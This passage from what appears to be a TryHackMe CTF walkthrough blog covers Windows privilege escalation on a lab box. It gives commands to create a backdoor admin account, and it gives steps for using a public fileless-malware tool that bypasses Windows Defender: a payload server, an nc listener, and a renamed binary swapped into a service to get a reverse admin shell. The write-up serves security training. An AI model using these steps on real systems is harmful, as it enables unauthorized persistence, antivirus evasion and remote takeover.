account.</p><p><img src=/images/THM-HackSmarterSecurity/privileged-shell.png alt="Privileged shell obtained"></p><p>But the shell is unstable and dies quickly. Because the service is not starting properly (since we replaced the file), WIndows is timing it out.</p><p><img src=/images/THM-HackSmarterSecurity/service-error.png alt="Service cannot be started and gets timed out"></p><p>To establish persistence a new user can quickly be created and added to the <code>administrators</code> group to gain admin privileges.</p><pre tabindex=0><code>net user &lt;username&gt; &lt;password&gt; /add
net localgroup administrators &lt;username&gt; /add
</code></pre><p><img src=/images/THM-HackSmarterSecurity/persistence-account.png alt="Persistence is achieved via the creation of a new privileged user"></p><p>The newly created account can then be used to access the system via SSH.</p><p><img src=/images/THM-HackSmarterSecurity/persistence-account-privs.png alt="Privileges of the newly created admin account"></p><h4 id=which-organizations-is-the-hack-smarter-group-targeting-next>Which organizations is the Hack Smarter group targeting next?</h4><p>Since we have admin privileges we can access the list of the next targets at <code>C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt</code>.</p><p><img src=/images/THM-HackSmarterSecurity/hacking-targets.png alt="Hackers&rsquo; targets list"></p><h3 id=using-fileless-malware>Using fileless malware</h3><p>Another method to bypass Windows Defender is to use <a href=https://github.com/daniellowrie/update_script>SecUp</a>. It is a &ldquo;fileless malware that bypasses Windows Defender using PowerShell and obfuscation.&rdquo; You can also check the <a href="https://www.youtube.com/watch?v=LjoAV3O40og&amp;ab_channel=DanielLowrie">YouTube video</a> for an explanation.</p><ol><li>Clone the repository</li></ol><pre tabindex=0><code>git clone https://github.com/daniellowrie/update_script
</code></pre><ol start=2><li>Start the engine. It also starts an HTTP server to transfer the malcious files.</li></ol><pre tabindex=0><code>go run SecUp.go 10.2.104.130
</code></pre><p><img src=/images/THM-HackSmarterSecurity/go-run.png alt="go run command"></p><ol start=3><li>Set up a listener on port 443</li></ol><pre tabindex=0><code>nc -lnvp 443
</code></pre><ol start=4><li>The compilation process creates a file named <code>update_script.exe</code></li></ol><pre tabindex=0><code>GOOS=windows go build update_script.go
</code></pre><p><img src=/images/THM-HackSmarterSecurity/malware-exe.png alt="files compilation"></p><ol start=5><li>Rename the malicious file as <code>spoofer-scheduler.exe</code> to make it work on the target.</li></ol><pre tabindex=0><code>mv update_script.exe spoofer-scheduler.exe
</code></pre><p>On the target stop the service, replace the legitimate file with your malicious file and restart the service. You should see the files getting uploaded on the target.</p><p><img src=/images/THM-HackSmarterSecurity/malware-success.png alt="Malware working successfully"></p><p>On the listener we get a shell with admin privileges that does not die.</p><p><img src=/images/THM-HackSmarterSecurity/admin-shell.png alt="Stable shell that does not die received"></p><p>And that&rsquo;s all I have for you on this one! There are many more ways to evade antiviruses/EDRs, one of which is <a href=https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/>AMSI Bypass</a>, I encourage you to learn and practice different methods. If you are into books I highly recommend <a href=https://www.amazon.com/Evading-EDR-Definitive-Defeating-Detection/dp/1718503342>Evading EDR: The Definitive Guide to Defeating Endpoint Detection Systems</a> and <a href=https://www.amazon.com/Antivirus-Bypass-Techniques-practical-techniques/dp/1801079749>Antivirus Bypass Techniques</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-manager/>&#8592;
Previous:
HTB: Manager</a></p><p class=prev-post-date>March 15, 2024</p></div><div class=next-post><p><a href=/posts/htb-analytics/>Next:
HTB: Analytics
&#8594;</a></p><p class=next-post-date>March 23, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#recon>Recon</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a><ul><li><a href=#what-is-usertxt>What is user.txt?</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#creating-a-new-admin-account>Creating a new admin account</a><ul><li><a href=#which-organizations-is-the-hack-smarter-group-targeting-next>Which organizations is the Hack Smarter group targeting next?</a></li></ul></li><li><a href=#using-fileless-malware>Using fileless malware</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>